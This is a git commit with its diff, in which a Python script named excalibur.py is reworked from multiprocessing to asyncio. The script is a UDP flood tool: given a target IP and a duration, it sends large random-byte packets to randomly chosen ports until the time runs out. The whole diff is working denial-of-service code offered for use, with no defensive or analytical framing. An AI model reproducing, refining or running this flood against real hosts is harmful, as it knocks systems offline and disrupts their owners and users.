139690f303107b4acae7879fca7c74f8c265e3a5
Cristian Bicheru <xxthegoldenbiscuitxx@gmail.com>
2019-01-26 00:23:33 +0000

    add excalibur

--- excalibur.py
+++ excalibur.py
@@ -3,37 +3,38 @@ import time
 import socket
 import random
 import sys
+import asyncio
 
 def usage():
     print("usage: " + sys.argv[0] + " <ip> <duration>")
 
-def connsofdeath(ip):
+async def connsofdeath(ip):
     timeout = time.time() + 4
     bytesU = random._urandom(65207)
 
     conn1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     conn2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    conn3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    conn4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     r1 = random.randint(1, 1024)
-    r2 = random.randint(1, 1024)
-    r3 = random.randint(1, 1024)
+    r2 = random.randint(1024, 2048)
 
     while time.time() < timeout:
         conn1.sendto(bytesU, (ip, r1))
         conn2.sendto(bytesU, (ip, r2))
-        conn3.sendto(bytesU, (ip, r3))
-        conn4.sendto(bytesU, (ip, 80))
+
+
+async def asyncflood(ip, cpucount):
+    coroutines = [connsofdeath(dest) for dest in [ip]*cpucount]
+    completed, pending = await asyncio.wait(coroutines)
 
 def flood(ip, duration):
     timer = time.time()+duration
-    cpuCount = multiprocessing.cpu_count()
-    
+    cpucount = multiprocessing.cpu_count()
+    event_loop = asyncio.get_event_loop()
     while time.time() < timer:
-        with multiprocessing.Pool(cpuCount) as p:
-            p.map(connsofdeath, [ip]*(cpuCount))
-    
+        task = event_loop.create_task(asyncflood(ip, cpucount))
+        event_loop.run_until_complete(task)
+    event_loop.close()
     print('ran for a duration of '+str(duration)+' seconds.')
 
 def main():
